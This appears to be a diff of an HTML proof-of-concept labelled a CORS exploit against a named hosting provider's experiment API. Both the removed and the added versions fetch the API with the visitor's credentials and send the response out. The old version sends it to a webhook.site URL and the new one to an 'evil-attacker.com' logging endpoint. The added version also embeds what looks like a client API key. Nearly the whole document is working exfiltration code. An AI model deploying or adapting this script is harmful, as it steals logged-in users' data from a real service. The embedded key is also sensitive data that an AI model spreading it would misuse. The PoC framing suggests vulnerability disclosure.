@@ -1,22 +1,27 @@
-<script>
-fetch("https://experiment-api.hostinger.com/sdk/v2/vardata?v=0", {
-  method: "GET",
-  credentials: "include"
-})
-  .then(res => res.text())
-  .then(data => {
-    // Leak to your webhook or log
-    fetch("https://webhook.site/133897bf-8640-4cd7-80dd-5561335f708e?data=", {
-      method: "POST",
-      body: data,
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hostinger CORS Exploit PoC</title>
+</head>
+<body>
+  <h2>Stealing Hostinger API Response...</h2>
+  <script>
+    fetch("https://experiment-api.hostinger.com/sdk/v2/vardata?v=0", {
+      method: "GET",
+      credentials: "include", // send cookies if any
       headers: {
-        "Content-Type": "text/plain"
+        "Authorization": "Api-Key client-cW5zRM9wiB0Wa9KqimmHzMcWGBXkKSK6"
       }
+    })
+    .then(response => response.text())
+    .then(data => {
+      // Exfiltrate to attacker's server
+      fetch("https://evil-attacker.com/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ stolenData: data })
+      });
     });
-  });
-</script>
-
-    document.getElementById("runBtn").addEventListener("click", stealData);
   </script>
 </body>
 </html>
